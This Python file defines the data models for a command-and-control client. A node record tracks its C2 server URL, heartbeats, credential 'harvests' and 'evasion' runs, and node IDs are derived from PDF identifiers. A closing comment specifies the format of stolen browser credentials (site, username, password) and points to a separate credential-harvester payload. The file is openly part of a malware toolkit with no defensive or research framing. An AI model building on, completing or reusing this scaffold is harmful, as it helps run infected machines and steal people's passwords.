"""Core data models for C2 client."""

from datetime import datetime
from typing import Optional, List, Dict
from dataclasses import dataclass, field
import uuid


@dataclass
class C2Node:
    """Core data model for C2 client node."""

    node_id: str
    watermark: str
    c2_url: str
    status: str = "disconnected"
    last_heartbeat: Optional[str] = None
    last_harvest: Optional[str] = None
    last_evasion: Optional[str] = None
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    updated_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())

    @classmethod
    def create(
        cls,
        c2_url: str,
        pdf_id: str,
        source_path: str,
    ) -> "C2Node":
        import hashlib
        node_id = f"node_{pdf_id[:8]}"
        watermark = hashlib.md5(
            (node_id + str(uuid.uuid4())[:8]).encode()
        ).hexdigest()[:8]
        return cls(
            node_id=node_id,
            watermark=watermark,
            c2_url=c2_url,
        )


# The credential model used by the harvester is a plain dict with keys:
#   type, site, username, password, timestamp, status
# This allows flexible typed credentials without dataclass constraint issues.
# See BrowserCredentialHarvester in payloads/browser_credential_harvester.py
C2Credential = dict
